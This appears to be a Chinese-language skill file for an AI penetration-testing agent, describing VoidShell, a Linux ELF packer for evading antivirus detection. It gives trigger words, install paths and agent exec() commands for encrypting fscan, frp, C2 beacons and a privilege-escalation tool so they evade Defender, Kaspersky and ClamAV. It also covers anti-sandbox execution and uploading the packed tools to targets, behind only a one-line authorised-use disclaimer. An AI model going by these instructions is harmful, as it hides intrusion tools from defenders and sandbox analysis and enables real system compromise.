---
name: voidshell-linux-av-bypass
description: VoidShell — Linux ELF 免杀打包工具。多层加密 + 内存执行 + 反沙箱，将 fscan/frp/C2 Beacon/RootHawk 等 Linux 工具打包为免杀版本，VT（VirusTotal）0 检测。VoidShell-fe 专攻 fork_exec 型程序免杀。触发词：voidshell、linux免杀、VT0、elf加密、linux bypass、elf免杀。
version: 1.0.0
---

# VoidShell — Linux ELF 免杀打包工具

## 概述

VoidShell 是由「词不达意安全」开发的 Linux ELF 免杀打包工具，核心原理：

```
原始 ELF ──→ [多层加密] ──→ [内存执行 Loader] ──→ 免杀版本
                                     ↑
                              磁盘永远不出现明文
```

| 特性 | 说明 |
|------|------|
| **VT 0 检测** | VirusTotal 0/65 引擎报毒 |
| **多层加密** | ELF 多轮加密 + 混淆 |
| **内存执行** | 解密后仅在内存中运行，磁盘不留痕迹 |
| **反沙箱模式** | `-run` 标志 → 普通执行直接退出，绕过沙箱分析 |
| **绕过引擎** | Defender for Endpoint (wdavdaemon)、Kaspersky、Huorong、ClamAV 等 |
| **完全静态** | 不依赖任何外部库，自包含 |

## 两个版本

| 版本 | 用途 | 用法 |
|------|------|------|
| **VoidShell** (标准版) | 普通 ELF 程序免杀 (fscan/frp/C2 beacon) | `voidshell INPUT OUTPUT [-run]` |
| **VoidShell-fe** (fork_exec版) | fork_exec 型程序免杀 (RootHawk等提权工具) | `voidshell-fe INPUT OUTPUT` |

## 安装位置

```
/root/CyberStrikeAI-1.7.6/tools/voidshell/
├── voidshell         # 标准版（fscan/frp/C2等）
└── voidshell-fe      # fork_exec版（RootHawk等提权类）
```

## 用法

### 标准免杀

```bash
# 基础用法: 输入 + 输出
/root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell fscan fscan_bypass

# 反沙箱模式: 需要 -run 才会真正执行
/root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell agent agent_sandbox -run

# 反沙箱模式运行:
./agent_sandbox -run    # ✅ 正常执行
./agent_sandbox         # ❌ 静默退出（绕过沙箱）
```

### fork_exec 免杀

```bash
# 用于会 fork 子进程的工具（如 RootHawk）
/root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell-fe RootHawk-amd64 rp
./rp -any              # 执行提权
```

### 我在渗透测试中调用

```bash
# 1. 免杀 fscan 内网扫描器
exec("cd /tmp && /root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell fscan_amd64 fscan_bp")
# 上传 fscan_bp 到目标 → 执行扫描

# 2. 免杀 frp 隧道客户端
exec("cd /tmp && /root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell frpc frpc_bypass -run")
# 上传 frpc_bypass → ./frpc_bypass -run -c frpc.ini

# 3. 免杀 RootHawk + 反沙箱
exec("cd /tmp && /root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell-fe /root/CyberStrikeAI-1.7.6/tools/roothawk/roothawk rh_bypass")
# 上传 rh_bypass → ./rh_bypass -any

# 4. 免杀 C2 Beacon
exec("cd /tmp && /root/CyberStrikeAI-1.7.6/tools/voidshell/voidshell beacon beacon_bypass -run")
```

## 实战组合

```
fscan/frp/C2 → VoidShell 加密 → 免杀版本 → 上传目标 Linux
                                      ↓
                              VT 检测: 0/65
                              杀软: Defender/Kaspersky/Huorong 均不报
                              行为: 内存解密运行，磁盘永远加密
```

## 注意事项

1. 仅用于 CTF/授权渗透测试，禁止对未授权目标使用
2. 加密后体积略增（约 +2MB）
3. fork_exec 类工具（提权/扫描器）必须用 VoidShell-fe 版本
4. 反沙箱模式 (`-run`) 避免在 cron/后台任务中使用，因为需要手动传 `-run`
5. 已知支持: fscan, frp, RootHawk, C2 beacon, Neo-reGeorg, Platypus
